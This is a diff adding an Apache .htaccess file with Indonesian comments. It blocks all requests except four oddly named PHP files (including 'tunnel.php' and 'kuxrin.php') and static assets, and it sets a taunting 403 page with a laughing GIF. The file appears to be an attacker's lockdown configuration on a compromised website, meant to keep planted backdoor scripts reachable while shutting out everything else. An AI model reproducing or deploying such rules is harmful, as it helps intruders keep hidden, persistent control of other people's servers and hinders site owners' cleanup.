@@ -1,0 +1,20 @@
+# Nonaktifkan directory listing
+Options -Indexes
+
+# Tampilkan halaman error custom sebagai GIF
+ErrorDocument 403 '<center><img src="https://media.tenor.com/WYQnYdWsmrkAAAAM/hahaha-lol.gif"></img> <h3>SEMANGAT CARI DOMAINNYA BOS MARAH - HIHIHI</font>'
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+
+# Izinkan file PHP tertentu saja
+RewriteCond %{REQUEST_URI} /(formats\.php|tunnel\.php|allow\.php|kuxrin\.php)$ [NC]
+RewriteRule .* - [L]
+
+# Izinkan file statis aman (html, css, js, gambar, font, dokumen, dll)
+RewriteCond %{REQUEST_URI} \.(html?|css|js|json|xml|txt|csv|svg|ico|woff2?|ttf|eot|otf|png|jpe?g|gif|webp|bmp|pdf|mp4|webm|ogg|mp3)$ [NC]
+RewriteRule .* - [L]
+
+# Blokir semua selain itu
+RewriteRule .* - [F]
+</IfModule>
